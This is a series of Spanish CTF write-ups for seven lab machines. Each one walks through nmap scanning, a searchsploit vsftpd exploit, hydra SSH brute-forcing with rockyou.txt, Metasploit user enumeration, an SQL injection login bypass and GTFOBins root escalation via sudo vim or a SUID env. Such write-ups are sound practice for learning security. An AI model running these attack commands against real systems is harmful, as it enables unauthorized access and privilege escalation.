# First-hacking
Fecha: 06/08/2024

Con nmap veo que la máquina tiene ftp abierto, y la versión es:

```
nmap -sV 172.17.0.2 
```

![](Imágenes/Pasted%20image%2020240806014855.png)

Con el siguiente comando, encuentro que hay vulnerabilidades para esta versión, y descargo el exploit correspondiente: 
```
searchsploit vsftpd 2.3.4 
searchsploit -m unix/remote/49757.py 
```


![](Imágenes/Pasted%20image%2020240806015038.png)

Por último, ejecuto ese script python, convirtiéndome en root de la máquina objetivo.
![](Imágenes/Pasted%20image%2020240806015246.png)



# Vacaciones 
Fecha: 06/08/2024

Hago nmap, y veo que tiene un servidor http abierto:
```
nmap -sV 172.17.0.2
```

![](Imágenes/Pasted%20image%2020240806152823.png)

Miro el html y veo el siguiente comentario:

![](Imágenes/Pasted%20image%2020240806152424.png)

Usando hydra y el diccionario rockyou.txt, con el usuario Camilo, intentaré meterme en la máquina:
```
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![](Imágenes/Pasted%20image%2020240806154321.png)

Como vemos, hay un usuario `camilo` con contraseña `password1`

Me conecto por ssh, y ya estamos en la máquina. 

![](Imágenes/Pasted%20image%2020240806154439.png)

Ahora buscaré el correo, ya que como dice el comentario, puede haber algo de valor allí. Antes, uso bash para usar una terminal más cómoda. 

![](Imágenes/Pasted%20image%2020240806154651.png)

Uso esta contraseña para acceder como juan: 

![](Imágenes/Pasted%20image%2020240806155049.png)

Haciendo `sudo -l` descubro que juan puede ejecutar /usr/bin/ruby con permisos de root:

![](Imágenes/Pasted%20image%2020240806155336.png)

En https://gtfobins.github.io/gtfobins/ruby/ encuentro que con el siguiente comando y con permisos de sudo, puedo obtener una shell de root:


![](Imágenes/Pasted%20image%2020240806155732.png)

Y, efectivamente:

![](Imágenes/Pasted%20image%2020240806155759.png)



# BorazuwarahCTF

Fecha: 07/08/2024
Empiezo haciendo un nmap completo, veo que tiene un apache en el puerto 80.

![](Imágenes/Pasted%20image%2020240807002812.png)

Primero busqué vulnerabilidades en esos servicios, pero no las encontré con searchsploit

![](Imágenes/Pasted%20image%2020240807004257.png)

Al acceder a la página, veo que únicamente hay una imagen, que descargo para buscar información:

![](Imágenes/Pasted%20image%2020240807003049.png)

Uso exiftool y encuentro un usuario, por lo que usaré hydra para probar contraseñas con la wordlist rockyou.txt, encontrando que tiene la contraseña 123456
```
sudo exiftool imagen.jpeg
```

![](Imágenes/Pasted%20image%2020240807003223.png)

```
sudo hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![](Imágenes/Pasted%20image%2020240807003336.png)

Me conecto por ssh y lo primero que hago es comprobar qué puedo hacer con sudo:

![](Imágenes/Pasted%20image%2020240807003448.png)

Puedo hacerme root simplemente haciendo `sudo bash` sin tener que introducir la contraseña: 

![](Imágenes/Pasted%20image%2020240807003640.png)

O hacer cualquier comando en la máquina con permisos de superusuario, por lo que haciendo `sudo su` e introduciendo la contraseña `123456` me hago root: 

![](Imágenes/Pasted%20image%2020240807003845.png)

# BreakMySSH
Fecha: 07/08/2024
Empiezo haciendo un scaneo completo a la máquina, y encuentro OpenSSH en el puerto 22.

![](Imágenes/Pasted%20image%2020240807004750.png)

Uso searchsploit para comprobar si hay alguna vulnerabilidad en esa versión, encontrando que hay la posiblidad de hacer 'Username Enumeration' . Intenté usar los scripts de searchsploit, pero no ví como usarlos, así que uso metasploit:

![](Imágenes/Pasted%20image%2020240807005624.png)

```
msfconsole 
```

![](Imágenes/Pasted%20image%2020240807011707.png)

Comandos usados:
```
search OpenSSH # podría haber concretado type:auxiliary ya que es info gather.
use 3 # Ya que el módulo que queremos usar tiene "id" 3
show options # Ver las opciones: interesa USER_FILE y RHOSTS, el puesto ya es 22
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt # Lista de posibles usuarios
set RHOSTS 172.17.0.2 
run
```


Vemos que el usuario "root" es accesible por ssh: 

![](Imágenes/Pasted%20image%2020240807013754.png)
Busco la contraseña hydra (resultado, `estrella`) y ya me conecto: 
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![](Imágenes/Pasted%20image%2020240807013949.png)

### Viendo otros writeups, he visto que hay otra solución:
En vez de la lista unix_users de metasploit, uso /usr/share/wordlists/rockyou.txt:

Encuentro el usuario lovely, y uso hydra, obteniendo la contraseña `rockyou`:
![](Imágenes/Pasted%20image%2020240807012550.png)

Que resulta ser `rockyou`. Tras mirar en su homepath, no veo nada, miro en /opt y hay un hash, que crackeando en una página online (https://crackstation.net/) se traduce como "estrella" (la contraseña de su)

![](Imágenes/Pasted%20image%2020240807014453.png)
![](Imágenes/Pasted%20image%2020240807014641.png)

# Injection
Fecha: 07/08/2024

Empiezo haciendo nmap: 
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](Imágenes/Pasted%20image%2020240807093218.png)

Compruebo ambas versiones con searchsploit, sin encontrar resultados. 

Visito la el servidor http desde un navegador, encontrando un formulario de login. Pruebo si puedo hacer SQL Inyection (escribiendo ' en el usuario y cualquier cosa en la contraseña), y obtengo que sí. 
![](Imágenes/Pasted%20image%2020240807093509.png)

Utilizo `admin` como usuario y `admin' OR '1'='1` como contraseña, con lo que obtengo un usuario y contraseña que pruebo conectándome por ssh a la máquina. (satisfactoriamente) 

![](Imágenes/Pasted%20image%2020240807093817.png)
Busco programas con el bit SUID: 
``` 
find / -perm -4000 -user root 2>/dev/null
```

![](Imágenes/Pasted%20image%2020240807094900.png)

Probaré con env, abriendo una terminal y consiguiendo ser root:
```
/usr/bin/env /bin/bash -p
```

- /usr/bin/env se usa para ejecutar un comando en un nuevo entorno modificado. 
- /bin/bash es el comando que ejecuto
- -p es una opción que tienen bash y sh para 

![](Imágenes/Pasted%20image%2020240807095221.png)
# Obsession
Fecha: 07/08/2024
Escaneo con nmap:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Lo primero que hago es comprobar si alguna de las versiones de los servicios encontrados es vulnerable (no) usando searchsploit 

![](Imágenes/Pasted%20image%2020240807180332.png)

Veo que hay unos ficheros en el ftp, así que me los descargo:

```
ftp ftp://172.17.0.2 
get pendientes.txt
get chat-gonza.txt
```

![](Imágenes/Pasted%20image%2020240807180657.png)

Miro el archivo y veo el nombre "russoski". Con hydra y el diccionario rockyou.txt, busco su contraseña (iloveme)

![](Imágenes/Pasted%20image%2020240807181119.png)

```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Me conecto por ssh, y haciendo `sudo -l` veo que puedo ejecutar /usr/bin/vim con permisos de superusuario. 

![](Imágenes/Pasted%20image%2020240807181720.png)

Busco en gtfobin y veo que haciendo el siguiente comando me convierto en root:

```
sudo vim -c ':!/bin/sh'
```

![](Imágenes/Pasted%20image%2020240807181815.png)
# Trust
Fecha: 13/08/2024

Empiezo haciendo un nmap:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.18.0.2 -oN scan
```

![](Imágenes/Pasted%20image%2020240807234054.png)

Ninguno de los servicios es vulnerable.

Visito la página y no veo nada interesante, así que hago fuzzing (usando  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt). Quito la opción de Be Recursive para encontrar los directorios y ficheros en el primer nivel más rápido. Encuentro `secret.php`, y al mirarlo en el browser encuentro un mensaje con un nombre: `mario`. Probaré este usuario con la wordlist rockyou.txt en hydra. 

![](Imágenes/Pasted%20image%2020240813004636.png)


![](Imágenes/Pasted%20image%2020240813004810.png)

Encuentro la contraseña `chocolate`, y entro en la máquina por ssh. 

![](Imágenes/Pasted%20image%2020240813005134.png)
Lo primero que hago es mirar qué puedo hacer con sudo, encontrando que puedo ejecutar /usr/bin/vim con permisos de superusuario. Busco en gtfobin y encuentro: https://gtfobins.github.io/gtfobins/vim/#sudo . Uso el comando y ya soy root. 

![](Imágenes/Pasted%20image%2020240813005305.png)

![](Imágenes/Pasted%20image%2020240813005325.png)